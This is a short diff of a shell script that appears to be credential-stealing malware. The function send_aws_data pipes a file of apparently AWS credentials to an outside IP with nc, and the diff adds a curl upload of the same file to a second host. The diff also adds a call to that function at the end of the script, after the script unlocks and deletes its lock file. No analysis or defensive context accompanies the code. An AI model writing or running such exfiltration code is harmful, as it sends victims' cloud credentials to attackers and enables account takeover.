@@ -173,14 +173,15 @@ fi
 send_aws_data(){
 cat $CSOF
 SEND_B64_DATA=$(cat $CSOF | base64 -w 0)
-cat $CSOF | nc 172.31.13.115 9999 $CSOF 
-
+cat $CSOF  | nc 172.31.13.115 9999 
+echo ""
+curl --upload-file $CSOF 192.168.61.78:9999
 }
 
 int_main
 
 chattr -i $LOCK_FILE 2>/dev/null 1>/dev/null
 rm -f $LOCK_FILE 2>/dev/null 1>/dev/null
-
+send_aws_data
 
 ##########End##########
